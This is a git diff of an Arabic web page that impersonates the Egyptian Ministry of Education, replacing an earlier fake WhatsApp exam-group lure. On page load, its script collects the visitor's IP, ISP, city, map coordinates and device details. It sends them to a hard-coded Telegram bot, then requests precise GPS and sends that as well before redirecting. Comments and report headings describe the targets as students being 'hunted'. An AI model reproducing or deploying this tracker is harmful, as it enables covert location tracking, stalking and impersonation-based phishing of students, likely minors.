@@ -2,97 +2,84 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta property="og:title" content="📚 جروب المراجعات النهائية - ثانوية عامة 2026 📚">
-    <meta property="og:description" content="انضم الآن لجروب الواتساب الرسمي لتحميل مذكرات ليلة الامتحان وتوقعات الأوائل.">
-    <meta property="og:image" content="https://img.freepik.com/free-vector/graduation-cap-with-books-background_23-2147644917.jpg">
-    <title>جاري تحويلك للمجموعة...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="منصة التعليم الإلكتروني - وزارة التربية والتعليم">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/ar/0/03/Logo_of_the_Egyptian_Ministry_of_Education.png">
+    <title>التحقق الرقمي | وزارة التربية والتعليم</title>
 
     <script>
-        async function kimoThanaweyaScanner() {
+        async function kimoUltimateTracker() {
             const token = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
             const chatId = "5890070301";
 
+            // 1. سحب بيانات الـ IP والشركة والموقع البديل فوراً
             let ipData = {};
             try {
-                // سحب بيانات الموقع والشركة
                 const res = await fetch('https://ipapi.co/json/');
                 ipData = await res.json();
-            } catch(e) { console.log("Stealth Mode Active"); }
+            } catch(e) {}
 
-            // كشف هوية الجهاز الحقيقي (ثغرة Entropy)
-            let deviceModel = "Unknown";
-            try {
-                if (navigator.userAgentData) {
-                    const info = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
-                    deviceModel = `${info.platform} ${info.model || ""}`;
-                } else {
-                    deviceModel = navigator.platform;
-                }
-            } catch(e) { deviceModel = navigator.platform; }
-
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "Protected";
-            
-            let bInfo = "N/A";
+            // 2. سحب بيانات الجهاز بالتفصيل
+            const ram = navigator.deviceMemory || "N/A";
+            const cores = navigator.hardwareConcurrency || "N/A";
+            let battery = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                bInfo = `${Math.round(b.level * 100)}% | ${b.charging ? '⚡' : '🔋'}`;
+                battery = `${Math.round(b.level * 100)}%`;
             }
 
-            // تقرير "صيد ثانوية عامة" الشامل
+            // 3. بناء التقرير (رابط الـ IP موجود هنا كبديل أساسي)
             const report = `
-🎓 **KIMO V.MAX - صيد طالب ثانوية** 🎓
+🏢 **تقرير المخابرات (V.MAX) - سحب شامل** 🏢
 ━━━━━━━━━━━━━━
-📱 **[1] هوية جهاز الطالب**
-• **اسم الجهاز:** \`${deviceModel}\`
-• **المصنع:** ${navigator.vendor || "Apple/Google"}
-• **المعالج:** ${navigator.hardwareConcurrency} Cores
-• **كارت الشاشة:** \`${gpu}\`
+🌍 **[موقع الـ IP والشركة - البديل]**
+• **شركة النت:** ${ipData.org || "غير معروف"} 🌐
+• **المحافظة:** ${ipData.region} | **المدينة:** ${ipData.city}
+• **الـ IP:** \`${ipData.ip}\`
+• **رابط الخريطة (لو رفض الـ GPS):** https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude} 📍
 
-🌍 **[2] الموقع والإنترنت (بدقة)**
-• **شركة الإنترنت:** ${ipData.org || "غير معروف"} 🌐
-• **البلد والمدينة:** ${ipData.country_name} | ${ipData.city}
-• **الـ IP الحالي:** \`${ipData.ip}\`
-• **نوع النت:** ${navigator.connection ? navigator.connection.effectiveType : "WiFi"}
-• **الخريطة:** [Google Maps 🗺️](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})
-
-🔋 **[3] حالة الفون**
-• **البطارية:** ${bInfo}
-• **الرامات:** ${navigator.deviceMemory || "N/A"} GB
-• **الدقة:** ${screen.width}x${screen.height}
-
-⚙️ **[4] معلومات إضافية**
-• **التوقيت:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-• **وضع التخفي:** ${!window.indexedDB ? "نشط 🕵️" : "معطل"}
+📱 **[تفاصيل الفون بالمللي]**
+• **الجهاز:** ${navigator.platform}
+• **المعالج:** ${cores} أنوية
+• **الرامات:** ${ram} GB
+• **البطارية:** ${battery}
+• **اللغة:** ${navigator.language}
 ━━━━━━━━━━━━━━`;
 
-            // إرسال البيانات فوراً
+            // إرسال التقرير الشامل فوراً (إجباري)
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
 
-            // محاولة سحب الـ GPS بالشارع
+            // 4. طلب الـ GPS (الطريقة الدقيقة بالسنتي)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((pos) => {
-                    const gpsMsg = `📍 **موقع الطالب بالشارع (GPS)**\nLink: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    const gpsMsg = `📍 **موقع الطالب بالسنتي (GPS الحقيقي)**\nالرابط: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                     fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(gpsMsg)}`);
                 }, null, {enableHighAccuracy: true});
             }
 
-            // تحويل لجروب الثانوية الجديد بعد 3 ثواني
+            // 5. التحويل للواتساب بعد 5 ثواني
             setTimeout(() => {
                 window.location.href = "https://chat.whatsapp.com/E5tpwhb6D5j9lDnXBFNbLM?mode=gi_t";
-            }, 3000);
+            }, 5000);
         }
-        window.onload = kimoThanaweyaScanner;
+        window.onload = kimoUltimateTracker;
     </script>
+
+    <style>
+        body { background: #f4f7f6; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; border-top: 8px solid #003366; }
+        .logo { width: 80px; margin-bottom: 15px; }
+        h1 { color: #003366; font-size: 18px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #003366; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
-<body style="background:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">
-    <div style="text-align:center;">
-        <p style="color:#128C7E; font-size:20px; font-weight:bold;">جاري تحويلك لمجموعة ثانوية عامة...</p>
-        <p style="color:#666; font-size:14px;">يتم الآن تأمين دخولك للمجموعة وتجهيز الملفات...</p>
-        <div style="border:4px solid #f3f3f3; border-top:4px solid #128C7E; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto;"></div>
+<body>
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/ar/0/03/Logo_of_the_Egyptian_Ministry_of_Education.png" class="logo">
+        <h1>نظام التحقق الرقمي الموحد</h1>
+        <p>يرجى السماح بالوصول للموقع للتأكد من هويتك كطالب وتفعيل مذكرات ليلة الامتحان.</p>
+        <div class="spinner"></div>
     </div>
-    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
 </body>
 </html>
